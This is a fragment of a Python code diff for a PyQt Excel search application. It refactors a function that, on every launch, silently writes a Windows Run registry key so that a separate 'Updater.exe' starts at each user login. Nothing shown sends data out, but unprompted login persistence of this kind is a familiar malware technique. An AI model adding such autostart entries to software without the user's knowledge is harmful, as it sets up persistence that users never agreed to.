+    """Keep the original updater auto-start behavior when the updater is present."""
+    updater_path = os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")
+    if not os.path.isfile(updater_path):
+        return
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
+        winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{updater_path}"')
+
+
+def main() -> None:
+    multiprocessing.freeze_support()
     app = QApplication(sys.argv)
     app.setApplicationName(APP_NAME)
     app.setOrganizationName(COMPANY_NAME)
     app.setStyle(QStyleFactory.create("Fusion"))
     window = ExcelSearchTool()
     window.show()
-    add_startup()
-
+    register_updater_startup()
     sys.exit(app.exec())
 
-def add_startup():
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
-    winreg.CloseKey(key)
 
 if __name__ == "__main__":
     main()
